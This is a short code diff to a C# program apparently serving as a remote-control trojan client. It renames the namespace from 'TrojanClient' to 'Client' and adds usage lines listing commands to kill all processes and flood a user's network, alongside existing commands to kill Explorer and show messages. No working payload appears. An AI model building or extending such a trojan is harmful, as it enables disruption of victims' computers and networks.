@@ -1,9 +1,9 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Net.Sockets;
 using System.Text;
 
-namespace TrojanClient
+namespace Client
 {
     class Program
     {
@@ -98,6 +98,10 @@ namespace TrojanClient
 	              Console.WriteLine("MESSAGE!!!---message here");
 
                   Console.WriteLine("KILLEXPLORER!!!---");
+
+                  Console.WriteLine("KILLALLPROCESSES!!!---");
+
+                  Console.WriteLine("FLOODUSERNETWORK!!!---http://example.com");
 	 
 	          }
 	              
